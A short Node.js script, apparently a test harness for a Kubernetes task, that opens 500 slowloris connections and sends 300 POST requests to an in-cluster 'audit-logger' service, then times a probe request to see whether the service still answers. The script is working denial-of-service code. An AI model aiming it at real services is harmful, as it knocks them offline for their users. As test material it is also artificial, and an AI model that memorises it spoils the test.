const net = require('net');
const http = require('http');
const start = Date.now();
const namespace = process.argv[3] || 'ns-baseline';

const host = `audit-logger.${namespace}.svc.cluster.local`;
const port = 80;

const slowlorisConnections = 500;
const connections = [];

function startSlowloris() {
    for (let i = 0; i < slowlorisConnections; i++) {
        const client = new net.Socket();
        client.connect(port, host, () => {
            client.write(`GET /log HTTP/1.1
Host: ${host}
`);
            const interval = setInterval(() => {
                if (client.writable) {
                    client.write(`X-a: ${Math.random()}
`);
                } else {
                    clearInterval(interval);
                }
            }, 2000);
            connections.push({ client, interval });
        });
        client.on('error', () => {});
    }
}

const floodRequests = 300;
function startFlood() {
    for (let i = 0; i < floodRequests; i++) {
        const req = http.request({
            hostname: host,
            port: 80,
            path: '/log',
            method: 'POST',
            timeout: 2000
        }, (res) => {
            res.on('data', () => {});
        });
        req.on('error', () => {});
        req.write(JSON.stringify({ log: "Storm" }));
        req.end();
    }
}

startSlowloris();
startFlood();

setTimeout(() => {
    const options = {
        hostname: host,
        port: 80,
        path: '/log',
        method: 'POST',
        timeout: 3000 
    };

    const req = http.request(options, (res) => {
        const duration = Date.now() - start;
        process.stdout.write(`${res.statusCode} ${duration.toFixed(2)}
`);
        cleanup();
    });

    req.on('error', (e) => {
        const duration = Date.now() - start;
        process.stdout.write(`000 ${duration.toFixed(2)}
`);
        cleanup();
    });

    req.end();
}, 10000);

function cleanup() {
    connections.forEach(conn => {
        clearInterval(conn.interval);
        conn.client.destroy();
    });
    process.exit(0);
}

// Hard timeout
setTimeout(() => { cleanup(); }, 40000);
